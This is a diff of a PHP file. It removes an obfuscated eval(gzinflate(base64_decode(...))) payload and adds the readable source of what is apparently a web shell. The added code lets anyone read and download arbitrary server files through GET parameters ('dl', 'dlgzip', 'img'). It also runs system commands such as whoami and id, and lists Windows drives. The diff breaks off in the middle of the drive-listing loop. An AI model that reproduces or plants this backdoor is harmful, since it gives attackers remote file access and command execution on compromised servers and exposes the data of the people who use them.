@@ -1,193 +1,703 @@
 <?php
 
-@error_reporting(0);
-@set_time_limit(0);
+if (isset($_GET['dl']) && ('' != $_GET['dl'])) {
+    $file = $_GET['dl'];
+    $filez = @file_get_contents($file);
+    header('Content-type: application/octet-stream');
+    header('Content-length: ' . strlen($filez));
+    header('Content-disposition: attachment; filename="' . basename($file) . '";');
+    echo $filez;
+    exit;
+} elseif (isset($_GET['dlgzip']) && ('' != $_GET['dlgzip'])) {
+    $file = $_GET['dlgzip'];
+    $filez = gzencode(@file_get_contents($file));
+    header("Content-Type:application/x-gzip\n");
+    header('Content-length: ' . strlen($filez));
+    header('Content-disposition: attachment; filename="' . basename($file) . '.gz";');
+    echo $filez;
+    exit;
+}
 
-$code = '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
-qx9vZx0dBuWjXuxe9jGbfTcy7sjzxa/7uprlZvb/onHf85tlpuZLZG3fS6jwn9yfj+5bj6/LMH9o
-PRmdg3Kf71/qoPD+p7nYuhXy733En23buJotk7s3cO3cbfbv5bBTkvtZ9Htclf94cX4+tvU1vx96
-/8QuN8V1z3n3sFLaV2wEaukGmkp/cdi5GA+HuJVdr16znk/l4Wr53tGlBvr/tT93dG9nXLqt2el/
-af9k/LlwOnOHtnt0YXFz1xtdqWzu78nqtRmO3UC9njMzOg3M/FM5O2vtnU7eTqW1f6vO7br+6eZV
-rjZT+QNcfeo3rqd7y1Z47mNWf+y8n56eZvXJXL88fjuXCpT6+y191nNNaJzfNnm930ZJuWrb08cP
-D/lmn5lVfurXNdH/POx7mrpu3F/JJOX3ue9WdqxOzUL073bzS5NrL0LnPnJnT095Lb6gct68MRTp
-reneXwqNqn6iNVu147Kj9Sv9e6yPeGbSH4/PNZ/9Cb+6NL23t4aLy0so9mlfN5+3HncHtY7+lX/X
-0Xf1lqFhnklut3j+MhrvC6MZvKyPTczNnle2XHdedX+v9zp5XyT9278yXzcuO0ZF2Gv3b57ZkPT7
-cNjbv+thLlGd+xzgSHx/PtfZ+fVKtS+lhutx/HhqDVk4qbx7XzPOT46zc3RmetR5P5+2L3O3UMUe
-5ifFgn6R77ui43td9JZ8fje9H43HXzQrX5n2zmz3pzvbO6qadyam9ppItXLxkK/VRJ3987XdP57e
-P6iC/nTvRpvLDRK6Uz9RKt2JlByeN6kDPzs60y4f7eX8yEPzrlwt15KdnF+fX+t3xtjd80Ab5R1W
-+qrYtw+xfXLjzbbtfu9/V8s3H8/zJnXlXk+y2N2/sPU/nNydeprHfUm6qt8MTQU1PvfRg+OBdF05
-a2mmmJU+q5+X70/LL6ahvKi857aJWscxRtv48bg6ds12tmq6MJjue3G9L3XKjUy04VzvdK3t0lRE
-uW5cXhbOrvDO6cq41Z8/df6x1d7afBzuT++nOw+Pl7d3s4r4znyh394+b7bxuPtidguLtnb9cN6r
-GbfvZmt7I+8Om27GFsdTNyzuO1Mrues+P9u5Luzq6vbjL3jXSzZZVOz+VpIFc6/Se79qVF7XxmHv
-Rn68vu3P3ZP+mreZz9wU0I8ZXmd7z6bGwqalyv3FbM9rbd/Jla2jWs7L6kO+4zsXVrKB07yqdynG
-/bdze7zYms/0j7LMmyUMw1S1V9o/E/mOt2dq/mtTq9/3jtHfTbU1y2p1rvcxuKpmKc5K/aPnjFy1
-z33Rkr5q9GNoXtfS93vYr9c6uP9rZ2XzcL8wedrqZli8M/dPjfUnXPMe96Q47xxfewMpK45155Tq
-r3556jfF2rScNd52ueT24S5/f3Va2e3mjeZc/bu41ai9yTXP8KyRhc/vPQis30Tojo9I3Ktfj+84
-snb7Y7V8q3fpm60ZWh2jitoxpfdq2mookn7SqZau8O3g8bx6fXjlab1LJjy6uJ/tl7b568Sg8S/m
-6KRsP0kDbzVqF84teu6yN9qp27zp/29s2n7vp3szNHLcsOX+Sr3YHL+pe/7KRnWjOjol0wKZ/diV
-fnzmnd82J0PaGY0cp5DbdqX1RVRzFHT9qg2PVSqtTJIHyVjWX3dbbOwggXZnk0zvP0ot2cVnQazV
-ndHEjTeqXnevJ0dJogHa675z1pEF9Wj3L3KfriqY9Xt51a9l+9uGifqwatZf+47mh35m57p7d08/
-PLy+7RrqwPcwV3K42q87lzcdc+9lpeapbFo4fZv529rxvKH2/M5Lzyl6z8FIwL+VTtVwd7uzuZrx
-OWRrK2drtS+14+mJpw+OOUT8xCjvpfFfazvcd259VysfNwo4wnzvzh/JeRbp62ZlJd5WLbKf84Iy
-cvXvp4dG5qWavy2792Dxuzgcdv/Ngn99eyc30cyc/vqhk3fruZNAyr9MWksp7O4K+mcvKzW3H6jx
-07yTZ0Mfy1VV6Om6ePGszr3fWmShqprt5kZnMzwo9P//Qb97o1qBidCqWbu5J6cfReSVz3p7082W
-hOTzJ9Jubx4X785y5u59/Tt84Nw9nNWnc3c5X5vN5d1ar93v1snasd3Xr+Kxib5fvW2bNmOqjm+N
-8NZMe3KvPOhriB+F5Ij8MRvWymju9utafHwvPl9unDy/t1nGhPK6aZ6fPw7SZLWjZyun4xj6rP+y
-Usw0t51fz93U125teTPb2Htozf7edqwm7/cLktHozRUNWG453Gi/utl/duXyoWvas3j+ZKGfy/UV
-WN9x+Wbnr3dxcEq74uSQcar5plA7Boal06Ou+oZYODohrmGBmraxw+LOjOfQW2Rj2plGhg4PDNIE
-VDsnWGNmlxDt16XDDTCzxS2XYOzOQCZ3sSe4ImVWKLY/gLhtsAVYNFR6PZ3UFw2yk8OZfCq6/GdI
-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';
+if (isset($_GET['img'])) {
+    @ob_clean();
+    $d = magicboom($_GET['y']);
+    $f = $_GET['img'];
+    $inf = @getimagesize($d . $f);
+    $ext = explode($f, '.');
+    $ext = $ext[count($ext) - 1];
+    @header('Content-type: ' . $inf['mime']);
+    @header('Cache-control: public');
+    @header('Expires: ' . date('r', mktime(0, 0, 0, 1, 1, 2030)));
+    @header('Cache-control: max-age=' . (60 * 60 * 24 * 7));
+    @readfile($d . $f);
+    exit;
+}
 
-@eval(gzinflate(base64_decode($code)));
+$ver = '1.01';
+
+$software = getenv('SERVER_SOFTWARE');
+
+if (@ini_get('safe_mode') or 'on' == strtolower(@ini_get('safe_mode'))) {
+    $safemode = true;
+} else {
+    $safemode = false;
+}
+
+$system = @php_uname();
+
+$win = false;
+
+$letters = '';
+
+if ('win' == strtolower(substr($system, 0, 3))) {
+    $win = true;
+} else {
+    $win = false;
+}
+
+if (isset($_GET['y'])) {
+    if (@is_dir($_GET['view'])) {
+        $pwd = $_GET['view'];
+        @chdir($pwd);
+    } else {
+        $pwd = $_GET['y'];
+        @chdir($pwd);
+    }
+}
+
+if (!$win) {
+    if (!$user = rapih(exe('whoami'))) {
+        $user = '';
+    }
+    if (!$id = rapih(exe('id'))) {
+        $id = '';
+    }
+    $prompt = $user . ' $ ';
+    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
+} else {
+    $user = @get_current_user();
+    $id = $user;
+    $prompt = $user . ' &gt;';
+    $pwd = realpath('.') . '\\';
+    $v = explode('\\', $d);
+    $v = $v[0];
+    foreach (range('A', 'Z') as $letter) {
+        $bool = @is_dir($letter . ':\\');
+        if ($bool) {
